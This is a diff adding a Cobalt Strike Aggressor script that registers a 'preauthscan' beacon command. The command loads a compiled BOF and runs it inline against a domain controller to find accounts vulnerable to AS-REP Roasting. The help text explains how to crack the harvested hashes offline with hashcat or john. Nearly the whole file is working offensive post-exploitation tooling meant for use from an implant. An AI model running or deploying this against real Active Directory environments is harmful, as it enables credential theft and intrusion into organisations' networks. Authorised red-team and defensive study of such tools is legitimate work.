@@ -1,0 +1,65 @@
+# Preauthscan BOF - AS-REP Roasting Scanner
+# Scans for accounts that do not require Kerberos pre-authentication
+
+beacon_command_register(
+    "preauthscan",
+    "Scan for accounts without Kerberos pre-authentication (AS-REP Roasting)",
+
+    "Scans a list of usernames to discover accounts that do not require\n" .
+    "Kerberos pre-authentication. Vulnerable accounts can have their\n" .
+    "AS-REP tickets cracked offline to recover passwords.\n\n" .
+
+    "Usage:\n" .
+    "   preauthscan <domain> <dc_ip> <userlist_file>\n\n" .
+
+    "Arguments:\n" .
+    "   \$1 - beacon id (automatically added by CS)\n" .
+    "   \$2 - Domain name (e.g., corp.local)\n" .
+    "   \$3 - Domain controller IP address\n" .
+    "   \$4 - Path to file containing usernames (one per line)\n\n" .
+
+    "Examples:\n" .
+    "   preauthscan corp.local 192.168.1.1 C:\\users.txt\n" .
+    "   preauthscan domain.com 10.0.0.5 C:\\temp\\userlist.txt\n\n" .
+
+    "Userlist file format:\n" .
+    "   - One username per line\n" .
+    "   - Lines starting with # are treated as comments\n" .
+    "   - Empty lines are ignored\n\n" .
+
+    "Notes:\n" .
+    "   - Discovered hashes can be cracked with hashcat mode 18200\n" .
+    "   - Or use john with format krb5asrep\n" .
+    "   - This technique is also known as AS-REP Roasting\n"
+);
+
+alias preauthscan {
+    local('$bid $domain $dc_ip $userlist $barch $handle $data $args');
+
+    # Parse arguments
+    ($bid, $domain, $dc_ip, $userlist) = @_;
+
+    # Validate arguments
+    if ($domain eq "" || $dc_ip eq "" || $userlist eq "") {
+        berror($bid, "Usage: preauthscan <domain> <dc_ip> <userlist_file>");
+        berror($bid, "Example: preauthscan corp.local 192.168.1.1 C:\\users.txt");
+        return;
+    }
+
+    # Log the task
+    btask($bid, "Starting AS-REP Roasting scan against $domain ($dc_ip) with userlist: $userlist");
+
+    # Get beacon architecture
+    $barch = barch($bid);
+
+    # Read the appropriate BOF file
+    $handle = openf(script_resource("preauthscan. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Pack arguments (z = null-terminated string)
+    $args = bof_pack($bid, "zzz", $domain, $dc_ip, $userlist);
+
+    # Execute the BOF
+    beacon_inline_execute($bid, $data, "go", $args);
+}
